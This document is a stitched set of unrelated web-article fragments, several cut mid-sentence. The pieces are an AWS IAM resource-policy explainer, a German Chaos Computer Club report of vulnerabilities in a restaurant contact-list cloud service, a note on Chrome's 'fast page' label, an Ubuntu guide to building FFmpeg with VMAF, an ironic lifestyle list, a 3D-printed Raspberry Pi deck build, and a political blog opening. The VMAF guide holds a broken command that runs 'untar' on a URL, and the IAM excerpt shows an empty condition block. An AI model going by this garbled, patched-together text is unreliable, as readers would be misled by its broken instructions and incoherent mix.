</span></code></pre></div></div> <p>The <code>Action</code> in resource-based policies can be one that is relevant to the service. A bucket policy can allow <code>s3:GetObject</code>, a role the <code>sts:AssumeRole</code>, while a Lambda the <code>lambda:InvokeFunction</code>.</p> <p>And the <code>Resource,</code> when needed, can only start with the resource’s own ARN. This makes sense as one resource can only give access to itself or things below it but not to unrelated resources.</p> <p>How the resource defines who gets access and how specific this control is depends on the service. The <code>Principal</code> element is always present and that can define users, roles, services, other accounts, and <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_elements_principal.html">a few other things</a>.</p> <p>But, especially with services, this is not granular enough. For example, when a role’s trust policy defines the Lambda service, it does not specify <em>which</em> Lambda function to trust. Similarly, the role for the CloudTrail allows the <code>cloudtrail.amazonaws.com</code> service, but there is no further restrictions on <em>which trail</em>.</p> <p>Some resource policies support conditions to allow only a given resource. For example, the policy for a Lambda function is able to selectively allow the API which can call it:</p> <div><div><pre><code><span>"Condition"</span><span>:</span><span> </span><span>{</span><span>
	</span><span>"ArnLike"</span><span>:</span><span> </span><span>{</span><span>

	</span><span>}</span><span>
</span><span>}</span><span>
</span></code></pre></div></div> <p>Unfortunately, there is no generic way to know which resource-based policies support further restrictions on the caller using conditions. You need to check the AWS-provided policy examples to see what conditions are possible.</p> <h2 id="using-together">Using together</h2> <p>When both types of policies are effective then you can use both to give and restrict access. When an IAM user wants to get an object from an S3 bucket then both the policy attached to the user and the one defined on the bucket are effective.</p> <h3 id="allowing-access">Allowing access</h3> <p>With most services if <em>either</em> of the policies give access to an action then it will be granted. The notable exceptions are KMS key policies and cross-account role trust policies where <em>both</em> the resource and the identity needs an explicit Allow.</p> <p>As resource-based policies can grant access to identities, the notion that a user can not do anything without attaching policies to it is not true.

August 27, 2020 | https://www.ccc.de/de/updates/2020/digitale-corona-listen | <a href="https://web.archive.org/web/*/https://www.ccc.de/de/updates/2020/digitale-corona-listen">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Mitglieder des Chaos Computer Clubs (CCC) haben mehrere Schwachstellen in einem weit verbreiteten Cloud-System für gastronomische Betriebe entdeckt und gemeldet. In Corona-Listen und Reservierungen waren mehrere Millionen sensible Datensätze einsehbar. Der Datenbestand reichte bis zu zehn Jahre zurück. Der Cloud-Service wurde informiert und hat die Schwachstellen nach eigenen Angaben beseitigt. Der CCC empfiehlt den Verzicht auf Cloud-Lösungen und rät dazu, Daten da zu sammeln, wo sie benötigt werden – in den Restaurants.</p><div><p>Das <a href="https://cert.ccc.de/">Chaos Emergency Response Team (CERT)</a> ist vielen bekannt als das Sanitäts- und Brandschutz-Team auf <a href="https://events.ccc.de/">Veranstaltungen des CCC</a>. Doch auch in der veranstaltungsfreien Zeit engagiert sich das CERT stets für die Sicherheit seines Umfelds.</p>
<h2>Digitale Corona-Listen</h2>
<p>Bei einem gemeinsamen Restaurantbesuch wurden Mitglieder des CERT gebeten, sich in eine <em>digitale</em> "Corona-Liste" einzutragen. Die gastgebenden Gastronominnen wollten die verpflichtende Datenerfassung offenbar modern und unkompliziert gestalten – mit Hilfe einer Cloud-Software.</p>
<p>Deren vollmundige Versprechen über die Sicherheit der erfassten Daten weckten Argwohn und Altruismus des CERT-Teams. Wie erwartet hatte das System akuten Bedarf an Sanitäts- und Brandschutzmaßnahmen durch Spezialkräfte des CCC.</p>
<h3>Über 87.000 Corona-Datensätze und 5,4 Mio. Reservierungen</h3>
<p>Verschiedene Schwachstellen ermöglichten den Zugriff auf insgesamt 87.313 Corona-Kontakterhebungen von 180 Restaurants, die das System aktiv nutzten*.</p>
<p>Im betroffenen System wurden jedoch nicht nur Corona-Listen, sondern auch Reservierungen, Bestellungen und Kassenumsätze gespeichert. <a href="https://archive.is/BS7zG">Der Cloud-Service wirbt damit</a>, monatlich über 96 Mio. Euro Umsatz von 7,7 Mio. Kundinnen sowie 600.000 Reservierungen über das System abzuwickeln*. Persönliche Daten von Besucherinnen werden vor allem bei Reservierungen und Corona-Registrierungen erfasst.</p>
<p>Insgesamt war der Zugriff auf 4,8 Mio. Personendatensätze aus über 5,4 Mio. Reservierungen möglich, wie der Cloud-Service bestätigt*.</p>
<h3>Daten reichen über ein Jahrzehnt zurück</h3>
<p>Erstaunt stellte das CERT fest, dass im System personenbezogene Daten gespeichert sind, die teilweise ein ganzes Jahrzehnt zurückreichen. Der Cloud-Service versteht sich als "<a href="https://de.wikipedia.org/wiki/Software_as_a_Service#Datenschutz_(DSGVO">Auftragsverarbeiter</a>" und verortet die Verantwortung zur Löschung bei den Gastronominnen. Die wiederum schienen sich dessen oft nicht bewusst zu sein und vertrauten verständlicherweise auf die Full-Service-Cloud.</p>
<h2>Mehrere Schwachstellen</h2>
<h3>Mangelndes Rechte-Management</h3>
<p>Durch eine fehlerhafte Prüfung der Zugriffsrechte konnte im Handumdrehen administrativer Vollzugriff auf sämtliche im System gespeicherten Daten erlangt werden. Andere Fehler in der API ermöglichten Nutzerinnen auch ohne besondere Rechte den Zugriff auf schützenswerte Daten, die nicht für Ihre Augen bestimmt waren. So konnte zum Beispiel Restaurant A auf die Corona-Daten von Restaurant B zugreifen.</p>
<h3>Unzureichend geschützte Passwörter</h3>
<p>Auch unzureichend geschützte Passwörter konnten mittels einfachem API-Request abgerufen werden. Dabei fielen dem Katastrophenschutz des CCC nicht nur Hashes, sondern auch Passwörter im Klartext auf. Für neuere Accounts wurde immerhin eine zeitgemäße Hashing-Methode verwendet.  Dennoch hätten in einer Stichprobe über 25% der Passwörter aus ihren Hashes geborgen werden können. Triviale Passwörter wie "1234" deuteten auf das Fehlen einer angemessenen Passwortrichtlinie hin.</p>
<p>Das Risiko schlecht geschützter Passwörter geht über den betroffenen Dienst hinaus, weil Nutzerinnen oft dazu neigen, das gleiche Passwort für mehrere Accounts zu verwenden.</p>
<h3>Großzügiges Bestellsystem</h3>
<p>Haben Sie in der Vergangenheit einmal vergeblich auf Ihr bestelltes Essen gewartet? Oder wurde Ihnen in einer Hamburger Eck-Kneipe mit 42 Litern Bier eine spontane Freude bereitet? Vielleicht hatte einfach nur eine brasilianische Teenagerin Spaß an der offenen API… Diese hat es ohne weitere Hindernisse ermöglicht,</p>
<ul>
<li>die Speisekarten aller Restaurants einzusehen und damit</li>
<li>für Dritte Bestellungen <em>auszulösen</em> oder zu <em>stornieren</em></li>
</ul>
<p>Selbstverständlich unter Umgehung sämtlicher gesetzter Einschränkungen. Weltweiter, grenzenloser Service!</p>
<h3>Schnelle Reaktion des Cloud-Anbieters</h3>
<p>Alle gefundenen Schwachstellen wurden durch die CERT-Mitglieder <em>Sophie, Martin, cwoomio, <br> deinkoks, Lady_Raven, Metal_Warrior, <br> Wellenformer, blubbel und cbro</em> <br> schriftlich dokumentiert und dem Betreiber gastronovi mit der Bitte um Behebung mitgeteilt.</p>
<p>In einer zügigen Reaktion bestätigte gastronovi alle gemeldeten Schwachstellen und machte sich an die umgehende Behandlung. Den lebensrettenden Sofortmaßnahmen folgt auf Rat des CCC nun auch eine ausführliche Diagnostik des Systems durch geschultes Fachpersonal.</p>
<h2>CCC rät von digitalen "Corona-Listen" ab</h2>
<p>Laut gastronovi sind die gemeldeten Schwachstellen inzwischen kuriert. Doch auch <a href="https://www.modzero.com/modlog/archives/2020/07/06/mit_webapps_gegen_covid-19/index.html">in den Systemen anderer Cloud-Services wurden bereits ähnliche Schwachstellen gefunden</a>.</p>
<p><em>"Denken first, digital second",</em> kommentiert Linus Neumann, Sprecher des Chaos Computer Clubs. <em>"Viele digitale Corona-Listen wurden mit der heißen Nadel gestrickt und machen schwer zu haltende Datenschutzversprechen. Die Sicherheit eines Papiersystems ist hingegen auch für Laien leicht zu beurteilen."</em></p>
<p>So haben etablierte Cloud-Services bestehende Systeme oft nur hastig "umfunktioniert", statt sich spezifisch mit den Sicherheits- und Datenschutzanforderungen des Contact-Tracings auseinanderzusetzen.</p>
<p><em>"Die sensiblen Daten landen dann nicht etwa beim Restaurant, sondern auf einem großen Haufen irgendwo im Internet, wo sie die nächsten Jahre auf interessierte Hackerinnen warten."</em></p>
<h3>Empfehlungen für Besucherinnen</h3>
<p>Sollte Ihr präferiertes Restaurant auf Cloud-Erfassung <em>bestehen</em>, raten wir zu neuen kulinarischen Abenteuern in anderen Etablissements.</p>
<p>Doch auch bei papierbasierter Erfassung empfiehlt der CCC das <a href="https://twitter.com/frank_rieger/status/1289113251461173248">Einrichten einer gesonderten pseudonymen E-Mail-Adresse nur für diesen Zweck</a>. Viele kostenlose Dienstanbieter ermöglichen zum Beispiel eine Weiterleitung von eingehenden Nachrichten an die eigentliche E-Mail-Adresse.</p>
<p>Fünfzehn Minuten Aufwand gewährleisten Datensparsamkeit ohne das Risiko, eine wichtige Warnung zu verpassen.</p>
<h3>Empfehlungen für die sichere Erfassung</h3>
<p>Der Chaos Computer Club rät grundsätzlich von digitalen Corona-Listen ab – erst recht, wenn diese ihre Daten in einer Cloud speichern, statt im Restaurant.</p>
<p>Auch in unseren eigenen Hackspaces verwenden wir folgendes Papier-System:</p>
<ol>
<li>Jede Besucherin oder Gruppe erhält einen <em>gesonderten Zettel</em> zur Erfassung, damit nicht die Daten anderer Gäste eingesehen werden können.</li>
<li>Der ausgefüllte Zettel wird in einen verschlossenen Briefkasten geworfen, um ihn dort <em>vor neugierigen Blicken zu schützen</em>.</li>
<li>Dieser wird am Ende des Tages in einen Umschlag geleert, welcher mit dem <em>Datum des erfassten Tages beschriftet und versiegelt</em> wird.</li>
<li>Die versiegelten Umschläge werden an einem <em>sicheren Ort</em> aufbewahrt.</li>
<li>Täglich wird ein Umschlag <em>sicher vernichtet</em>, dessen Frist abgelaufen ist – und ein neuer kommt hinzu.</li>
</ol>
<h3>Empfehlungen an den Gesetzgeber</h3>
<p>Das Ziel, Besucherinnen im Falle eines Falles schnell informieren zu können, ist legitim und wichtig. Dennoch wurden dem Unterfangen eine Reihe unnötiger Probleme in den Weg gelegt</p>
<ol>
<li>Es häufen sich die Fälle, in denen die <a href="https://www.haufe.de/compliance/recht-politik/polizeizugriff-auf-corona-gaestelisten-der-gastronomie-unzulaessig_230132_522174.html">Listen für Polizei-Ermittlungen zweckentfremdet wurden</a>. Derartige Maßnahmen motivieren Besucherinnen, falsche Daten in die Listen einzutragen.</li>
<li>Der Gesetzgeber sieht keinen Anlass, <a href="https://netzpolitik.org/2020/gastro-vorratsdatenspeicherung-bundesregierung-will-corona-listen-nicht-besser-schuetzen/">diesem Datenmissbrauch ein Ende zu setzen</a>.  Damit wird das geringe verbliebene Vertrauen weiter untergraben.</li>
<li><a href="https://www.spiegel.de/wirtschaft/soziales/corona-und-restaurants-kundendaten-fuer-einen-schnellen-flirt-a-453e410e-50d4-4d2a-a128-fdaa2b34eee2">In vielen Einrichtungen liegen die Listen offen aus, was die Sorge vor unerwünschtem Kontakt durch andere Gäste weckt</a>.</li>
</ol>
<p>Leichtfertig verspieltes Vertrauen kann jetzt nur noch durch eine klare gesetzliche Regelung zurückgewonnen werden.</p>

However, if a page is considered fast by Core Web Vitals, but there isn’t enough real-world data for the page, it won’t display the label.</p><figure><img loading="lazy" width="2048" height="1234" src="https://www.coywolf.news/wp-content/uploads/2020/08/performance-hints-fast-labelling.png" alt="Fast page label" srcset="https://www.coywolf.news/wp-content/uploads/2020/08/performance-hints-fast-labelling.png 2048w, https://www.coywolf.news/wp-content/uploads/2020/08/performance-hints-fast-labelling-300x181.png 300w, https://www.coywolf.news/wp-content/uploads/2020/08/performance-hints-fast-labelling-1024x617.png 1024w, https://www.coywolf.news/wp-content/uploads/2020/08/performance-hints-fast-labelling-768x463.png 768w, https://www.coywolf.news/wp-content/uploads/2020/08/performance-hints-fast-labelling-1536x926.png 1536w, https://www.coywolf.news/wp-content/uploads/2020/08/performance-hints-fast-labelling-1046x630.png 1046w, https://www.coywolf.news/wp-content/uploads/2020/08/performance-hints-fast-labelling-150x90.png 150w" sizes="(max-width: 2048px) 100vw, 2048px"><figcaption>Chrome 85 will have “Fast page” label when a user long-presses a link</figcaption></figure><p>The label is likely a taste of how Google will be incorporating Core Web Vitals into Google Search. It’s highly probable that Google will use a label or icon to denote fast pages, similar to what they do now for AMP pages. I also predict that sites will be told that more searchers click on results that have a fast symbol, and therefore they’ll need to score “Good” on Core Web Vitals, or they may not rank as well. I think that presupposition will age well come next year.</p><figure><img loading="lazy" width="750" height="778" src="https://www.coywolf.news/wp-content/uploads/2020/08/amp-icon-search-results-1.png" alt="" srcset="https://www.coywolf.news/wp-content/uploads/2020/08/amp-icon-search-results-1.png 750w, https://www.coywolf.news/wp-content/uploads/2020/08/amp-icon-search-results-1-289x300.png 289w, https://www.coywolf.news/wp-content/uploads/2020/08/amp-icon-search-results-1-607x630.png 607w, https://www.coywolf.news/wp-content/uploads/2020/08/amp-icon-search-results-1-150x156.png 150w" sizes="(max-width: 750px) 100vw, 750px"></figure><p>For now, the label will be limited to Chrome users that are in <a href="https://support.google.com/chrome/answer/2392284">Lite mode</a> (an Android-only feature) or have “<a href="https://support.google.com/chrome/answer/9116376">Make searches and browsing better</a>” turned on (a setting that sends URLs of pages you visit to Google).</p><h2>Never miss an important story</h2><p>Weekly news updates, no spam, and you can unsubscribe anytime.</p> <div><p><img alt="" src="https://secure.gravatar.com/avatar/93d2d6e6492828a2f1f427dddc413f4b?s=120&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/93d2d6e6492828a2f1f427dddc413f4b?s=240&amp;d=mm&amp;r=g 2x" height="120" width="120" loading="lazy"></p><div><p><a rel="author" href="https://www.coywolf.news/jon-henshaw/">Jon Henshaw</a></p><p><small>Jon is the founder and Managing Editor of Coywolf.

It’s become very popular as it succeeds (not fully) at automating subjective quality testing that usually requires humans to watch and score videos.</p><p>FFmpeg and Netflix’s VMAF are now part of every video processing and compression engineer’s toolbox. But, installing and using them appears to be difficult for a large number of users.</p><p>I see these questions often on Stackoverflow and similar websites -</p><ul><li>how to compute VMAF?</li><li>how do I compile VMAF on Ubuntu?</li><li>how do I calcuate VMAF using FFmpeg?</li><li>no such filter <code>libvmaf</code> when trying to use VMAF with FFmpeg.</li><li>VMAF example commandline</li></ul><p>and the list simply goes on. So, I decided to write down the steps of compiling and installing VMAF, FFmpeg, and computing VMAF with FFmpeg. Along the way, I’ll show you a few gotchas and common errors in the installation and usage procedure.</p><h2 id="step-0-machine-setup">Step 0: Machine Setup</h2><p>For the purpose of this document, I will set up a new $5 droplet on DigitalOcean with Ubuntu 18.04 as its operating system.</p><p>By the way, if you <a href="https://m.do.co/c/90eb9b431b9e">click here</a>, you'll receive $100 in DigitalOcean credits over 60 days! That's 60 days and $100 to experiment and play around with DigitalOcean :)</p><h2 id="step-1-install-vmaf-on-ubuntu-1804">Step 1: Install VMAF on Ubuntu 18.04</h2><p>You can use VMAF in several different ways and you can <a href="https://github.com/Netflix/vmaf">read about it here</a>. In order to use VMAF with FFmpeg, we need the help of <code>libvmaf</code> - a C library that can be used with C/C++ code. In other words, we can use it with FFmpeg.</p><p>So, here is how to install VMAF on an Ubuntu 18.04 machine -</p><p><strong>Step 1:</strong> Download the latest release of VMAF from <a href="https://github.com/Netflix/vmaf/releases">here</a>.</p><div><pre><code data-lang="bash">wget https://github.com/Netflix/vmaf/archive/v1.5.2.tar.gz
</code></pre></div><p><strong>Step 2:</strong> Untar it</p><div><pre><code data-lang="bash">untar -xvf https://github.com/Netflix/vmaf/archive/v1.5.2.tar.gz
</code></pre></div><p><strong>Step 3:</strong> Install dependencies.</p><div><pre><code data-lang="bash">sudo apt update
sudo apt install python3 python3-pip python3-setuptools python3-wheel ninja-build doxygen
pip3 install meson
pip3 install Cython
pip3 install numpy
</code></pre></div><p><strong>Step 4:</strong> Make and Install VMAF</p><div><pre><code data-lang="bash"><span>cd</span> vmaf-1.5.2/
sudo make 
sudo make install
</code></pre></div><p>Make a note of where VMAF’s <code>libvmaf</code> got installed. In my machine, it was installed to <code>/usr/local/lib/x86_64-linux-gnu</code> as per the console log.</p><div><pre><code data-lang="bash">Installing src/libvmaf.so.0.0.0 to /usr/local/lib/x86_64-linux-gnu

</code></pre></div><h2 id="step-2-install-ffmpeg-with-vmaf-support-on-ubuntu-1804">Step 2: Install FFmpeg with VMAF support on Ubuntu 18.04</h2><p>The first part is complete and you have successfully installed VMAF onto your machine. Now, let’s compile and install FFmpeg with VMAF support. These instructions are taken from <a href="https://trac.ffmpeg.org/wiki/CompilationGuide/Ubuntu">FFmpeg’s Ubuntu Compilation Guide</a></p><p><strong>Step 1:</strong> Install the Dependencies (including <code>nasm</code>). And, remember to create the following folders</p><div><pre><code data-lang="bash">mkdir -p ~/ffmpeg_sources ~/bin
</code></pre></div><p><strong>Step 2:</strong> Install the Video and Audio Codecs that you are going to need. I installed <code>libx264</code>, <code>libx265-dev</code>, <code>libnuma-dev</code>, <code>libvpx-dev</code>, <code>libfdk-aac-dev</code>, <code>libmp3lame-dev</code>, and <code>libopus-dev</code>.</p><p><strong>Step 3:</strong> Make sure FFmpeg knows where to find <code>libvmaf</code></p><div><pre><code data-lang="bash"><span>export</span> <span>LD_LIBRARY_PATH</span>=<span>$LD_LIBRARY_PATH</span>:/usr/local/lib/x86_64-linux-gnu/

You should now have an FFmpeg build with VMAF enabled.</p><h2 id="step-3-computing-ffmpeg-with-vmaf">Step 3: Computing FFmpeg with VMAF</h2><p>Now let’s see how we can calculate the VMAF score between two videos using FFmpeg and VMAF.</p><p><strong>Step 1:</strong> Let’s create two test videos - a 1920x1080p30 video and a 1280x720p30 video using FFmpeg’s built-in libraries that generates test data. The commandlines are shown below and as you can see, it will generate two 5-second duration clips, 30 fps, of 1920x1080p and 1280x720p resolution.</p><div><pre><code data-lang="bash">bin/ffmpeg -f lavfi -i <span>testsrc</span>=<span>duration</span>=5:size=1920x1080:rate=<span>30</span> test_1080p30.mpg
bin/ffmpeg -f lavfi -i <span>testsrc</span>=<span>duration</span>=5:size=1280x720:rate=<span>30</span> test_720p30.mpg
</code></pre></div><p><strong>Step 2: Compute the VMAF score between the two videos.</strong><br>From the commandline below, you can see that we are providing the two input sequences, and then we are scaling both to 1920x1080 using a <code>bicubic</code> filter. This is important because VMAF works only on sequences having the same resolution (and the frame rate should match, else you’ll have serious problems). We are also asking FFmpeg to compute the PSNR score for these two sequences.</p><div><pre><code data-lang="bash">bin/ffmpeg -i test_720p30.mpg -i test_1080p30.mpg -filter_complex <span>"[0:v]scale=1920x1080:flags=bicubic[main]; [1:v]scale=1920x1080:flags=bicubic,format=pix_fmts=yuv420p,fps=fps=30/1[ref]; [main][ref]libvmaf=psnr=true:log_path=vmaflog.json:log_fmt=json"</span> -f null -
</code></pre></div><p>and it should print the VMAF score as follows on the console</p><div><pre><code data-lang="bash">[libvmaf @ 0x55803f80c7c0] VMAF score: 86.375268
</code></pre></div><p><strong>Note:</strong></p><ol><li>The detailed per-frame details are contained in the JSON file. It contains the per-frame VMAF and PSNR scores as requested.</li><li>In FFmpeg’s filter, you can use either <code>bicubic</code> or <code>lancsoz</code> filters for the upsampling process. Netflix <a href="https://netflixtechblog.com/vmaf-the-journey-continues-44b51ee9ed12">suggests</a> that <code>bicubic</code> is a better choice.</li></ol><h2 id="options-for-vmaf-using-ffmpeg">Options for VMAF using FFmpeg</h2><p>The following commandline options are available in FFmpeg for computing VMAF.</p><ul><li><code>model_path</code>
Set the model path which is to be used for SVM. Default value: <code>/usr/local/share/model/vmaf_v0.6.1.pkl</code></li><li><code>log_path</code>
Set the file path to be used to store logs.</li><li><code>log_fmt</code>
Set the format of the log file (xml or json).</li><li><code>enable_transform</code>
This option can enable/disable the score_transform applied to the final predicted VMAF score, if you have specified score_transform option in the input parameter file passed to run_vmaf_training.py Default value: <code>false</code></li><li><code>phone_model</code>
Invokes the phone model which will generate VMAF scores higher than in the regular model, which is more suitable for laptop, TV, etc. viewing conditions. Default value: <code>false</code></li><li><code>psnr</code>
Enables computing psnr along with vmaf. Default value: <code>false</code></li><li><code>ssim</code>
Enables computing ssim along with vmaf. Default value: <code>false</code></li><li><code>ms_ssim</code>
Enables computing ms_ssim along with vmaf. Default value: <code>false</code></li><li><code>pool</code>
Set the pool method to be used for computing vmaf. Options are <code>min</code>, <code>harmonic_mean</code> or <code>mean</code> (default).</li><li><code>n_threads</code>
Set number of threads to be used when computing vmaf. Default value: <code>0</code>, which makes use of all available logical processors.</li><li><code>n_subsample</code>
Set interval for frame subsampling used when computing vmaf. Default value: <code>1</code></li><li><code>enable_conf_interval</code>
Enables confidence interval. Default value: <code>false</code></li></ul><h2 id="common-problems-while-using-vmaf-and-ffmpeg">Common problems while using VMAF and FFmpeg.</h2><p>P1. While installing FFmpeg from the official compilation guide on Ubuntu 18.04, you will face this error <code>ERROR: gnutls not found using pkg-config</code>. To prevent this, you need to install <code>sudo apt-get install libunistring-dev</code>.</p><p>P2. Another common problem when running FFmpeg with VMAF is this <code>error libvmaf xxx not found using pkg config</code>. This means that while compiling FFmpeg, you didn’t tell it where the <code>libvmaf</code> files are. Simply run the export command and it should fix the issue.</p><div><pre><code data-lang="bash"><span>export</span> <span>LD_LIBRARY_PATH</span>=<span>$LD_LIBRARY_PATH</span>:/usr/local/lib/x86_64-linux-gnu/
</code></pre></div><h2 id="thats-it">That’s It</h2><p>I hope you were able to follow this guide and could successfully install VMAF, FFmpeg and compute the VMAF score using FFmpeg. If you faced any issues, let me know via email (check the contact page).</p><p>Take care and see you next time!</p></div></article></div></div>]]>

<p>
	(part of <a href="https://sive.rs/d1">the “do this” directives</a>)
</p>
<h3>1.
	Prioritize lifestyle design.
</h3><p>
	You’ve made it, so it’s all about you, now.  Make your dreams come true.
</p><p>
	Shape your surroundings to please your every desire.
</p><p>
	Make your <a href="https://sive.rs/book/TimeParadox">immediate gratification</a> the most important thing.
</p>

<h3>2.
	Chase that comparison moment.
</h3><p>
	You have the old thing. You want the new thing.
	Yes! Do it! Be happy for a week.
</p><p>
	Ignore the fact that the <a href="https://sive.rs/book/StumblingOnHappiness">happiness only comes from the moment of comparison between the old and new</a>.
</p><p>
	Once you’ve had your new thing for a week, and it becomes the new norm, seek happiness from another new thing.
</p>

<h3>3.
	Buy, not rent.
</h3><p>
	Why rent a house, castle, boat, or car, when you can buy?
</p><p>
	It’s not about the thing, it’s about identity.
	This shows who you are now.
</p>

<h3>4.
	Internalize your new status.
</h3><p>
	You worked hard to get here.
	Celebrate. Relax.
</p><p>
	Admit you are in a different class of people now, with different needs.
</p><p>
	Understand there is no going back.
</p>

<h3>5.
	Be a connoisseur.
</h3><p>
	Learn what others say is the finest.
</p><p>
	Insist on only the finest.
</p><p>
	You will now be <a href="https://sive.rs/book/StoicJoy">unhappy</a> with anything but the finest.
</p>

<h3>6.
	Get to know your possessions.
</h3><p>
	Now that you own the best, it’s time to focus on what you’ve got.
</p><p>
	Learn all about the features of your new possessions.
</p><p>
	Spend more time getting your surround sound and heated floor just right.
</p><p>
	Work out the solar panel charging of your Tesla car.
	This is important.
</p>

<h3>7.
	Acclimate to comfort.
</h3><p>
	Eliminate every discomfort from your life.

The idea is a simple one- many Makers asked me over the last year about printing smaller parts for the <a href="https://back7.co/home/raspberry-pi-recovery-kit">Raspberry Pi Recovery Kit</a>, and I started playing around with options.  I knew I didn’t want to just re-hash the old deck, and I knew I really wanted a better display for this year.  Let’s jump in with what’s different:</p><ul data-rte-list="default"><li><p>No Pelican case required!  It’s pretty obvious from the photos that you don’t need to spend $50 or more on a case, especially if you are going to drill holes in it, or don’t actually need a waterproof case.</p></li><li><p>Smaller Bill of Materials (BOM).  The original Raspberry Pi Recovery kit was very expensive to build, primarily because I sourced the coolest looking parts I could, which can be expensive or just hard to get (like the keyboard).  This project has a much simpler BOM, so simple that here it is:</p><ul data-rte-list="default"><li><p>1 kg spool of Paramount 3D’s Olive Green PETG - <a href="https://amzn.to/31lMcqy">Amazon Link</a></p></li><li><p>(Optional) 1K spool of Carbon Fiber PETG and hardened steel nozzle - <a href="https://www.matterhackers.com/store/l/carbon-fiber-pro-series-petg-filament-1.75mm/sk/MHQ646TD">Link</a> and <a href="https://www.matterhackers.com/store/l/e3d-v6-extra-nozzle-hardened-steel-1.75mm-x-0.40mm/sk/MSDV7HN9">Link</a></p></li><li><p>Low profile, stainless steel M5 screws - <a href="https://www.mcmaster.com/92855A513/">McMaster Carr Link</a></p></li><li><p>M5 threaded rod - <a href="https://www.mcmaster.com/93325A413/">McMaster Carr</a> (<a href="https://amzn.to/2Evq9Vu">bolt cutters</a> are optional, but use safety gear)</p></li><li><p>Four threaded inserts - <a href="https://amzn.to/2FWzNBj">Amazon Link</a></p></li><li><p>Pimoroni HDMI Display - <a href="https://www.adafruit.com/product/4337">Adafruit Link</a></p></li><li><p>Short HDMI Cable - <a href="https://amzn.to/31tQP21">Amazon Link</a></p></li><li><p>Four brass M2.5 standoffs - <a href="https://amzn.to/2CUUKeF">Amazon Link</a></p></li><li><p>Raspberry Pi 4 - <a href="https://amzn.to/2YwHFzF">Amazon Link</a></p></li><li><p>Core Design - <a href="https://www.tinkercad.com/things/b4bWC7f62Ab-sizzling-fyyran/">Tinkercad Print Layout</a>, <a href="https://www.tinkercad.com/things/eTexyDTsTKR-stunning-kieran/">Tinkercad Assembled Version</a>, <a href="https://www.thingiverse.com/thing:4579460">Thingiverse</a></p></li><li><p>Thumb Screws - <a href="https://www.mcmaster.com/93886A240/">McMaster Carr</a></p></li><li><p>Cord Grip - <a href="https://www.mcmaster.com/8302K161/">McMaster Carr</a></p></li></ul></li><li><p>Something easier to modify/hack over time.  The <a href="https://back7.co/home/raspberry-pi-recovery-kit">RPRK</a> was designed to be a “finished” product and execution on an idea, and with people making their own, I thought it would be more fun this time around if people could swap out parts for their own, even ones to radically change the look of the deck.</p></li><li><p>I abandoned panel mount ports on this project.  Panel mounts are often for looks only, at least on many of my older builds, and to keep costs down I just ditched them.  Big, rounded rectangle holes work for me, and don’t cost $15 each time I want to change something.</p></li><li><p>Finally, I wanted a design I could continue to refine and modify for my own projects.  Hopefully I’ll have more of those to share soon!</p></li></ul><p>With that out of the way, let’s go over the basic design.  This can be used as assembly instructions in a pinch too.  Here’s the front frame, which the Pimoroni display will connect to.  That’s really done last, so we won’t see this part again for a while.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597467959462_38425"><p>With that out of the way let’s focus on the main frame, which helps hold it all together.  Here are some of the parts.</p></div><div data-block-type="2" id="block-yui_3_17_2_1_1597469013003_18333"><div><p>The design is simple for the front- there are four threaded inserts for holding the display on the front.  Make sure they go on the front of the front frame.  There are two halves of the front frame, which is held together by the “joiner” part, which has spare M5 holes in case you want to mount something here.  I was still on a carbon fiber kick (read: I still had the hardened steel nozzle installed) so that part was printed with that stuff.  It’s great, but not required if you don’t want to deal with a second and somewhat picky filament.</p><p>Next it’s all about printing all of the rear parts, including what I call the ends and the top/bottom.  </p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597469013003_22206"><p>The top and bottom parts are not interchangeable between top and bottom, they go on one orientation only.  This will likely take a while to print!</p></div><div data-block-type="2" id="block-yui_3_17_2_1_1597469013003_26233"><div><p><strong>CAUTION:</strong></p><p>As you start to assemble be careful of the resistance of some of the deeper holes that screws and threaded rods are going into.  If you feel too much resistance you may need to drill or tap some of the holes- this depends a ton on your printer.  This is especially true of the M5 threaded rod in the next section, which can get bound in the many parts and get very difficult to move.  If you think that’s happening, back out the M5 rod and use a power drill to drill the part holes.  You really only need threading on the parts on each end of the enclosure, and even if you drill it all out, end caps/nuts will do fine to hold the whole thing together.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1597469013003_27776"><div>

Not all the uppers and lowers will need to be bolted in, but each of the uppers and lowers has the screw hole just in case.  This just makes it easier to keep parts organized.  With all of them bolted it should look like this:</p></div><div data-block-type="5" id="block-yui_3_17_2_1_1597469013003_33687"><div>

This design took about 7 months to design, including a 3 month break due to life and COVID impacts.  I am lucky so far to be able to continue to work on these projects, and it’s been a great relief to “finish” it.  Like all of my previous projects here, all of the design files and parts lists are in this article so people can make/modify as they see fit.  I would remind fellow makers that it’s licensed under a non-commercial license, so while you can print/modify, doing so commercially is not supported under this project.  Want to do that?  Just reach out to me and we can figure something out.</p><p>Going forward though, many of my originals like this one will be for sale in my shop.  They will be more expensive than making it yourself, so if you’re willing to try- make one!  Commissions are limited and not guaranteed, so the items from my project builds may not last.  Check out <a href="https://back7.co/store">https://back7.co/store</a> to see what’s in stock.</p><p>With that out of the way, here are some quick FAQs on my projects related to this one, the Mil-Plastic case:</p><ul data-rte-list="default"><li><p><strong>Aren’t these just Raspberry Pi laptops?</strong>  Actually, they’re a bit more than that.  This is part sculpture, part functional electronics, and part exercise in design and DIY.  If you want a laptop, then that’s probably the option for you.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3389">

<div>
<p>Those that know me, know that I am both bold and resolute. I stand by my thoughts / comments, yet I attempt to keep an open mind, analyze a situation, self-reflect on any biases, and integrate feedback. I even go so far as to analyze my confidence level, see <a href="https://predictionbook.com/" target="_blank" rel="noopener noreferrer">predictionbook.com</a>.</p>
<p>With that in mind. I want to share how utterly angry and helpless I feel —</p>
<p>I can’t share my true thoughts, hell my analysis, of the current political situation in the U.S. Although I have written on it countless times, I end up deleting the posts.</p>
<p>Why?</p>
<p>It’s not safe to share thoughts.</p>
<h2>State of Affairs</h2>
<p>Today, sharing one’s opinion can cost you your livelihood, your ability to communicate, and more.</p>
<p>Historically, that was always true, perhaps more-so. We’re now returning to the status quo — repression.</p>
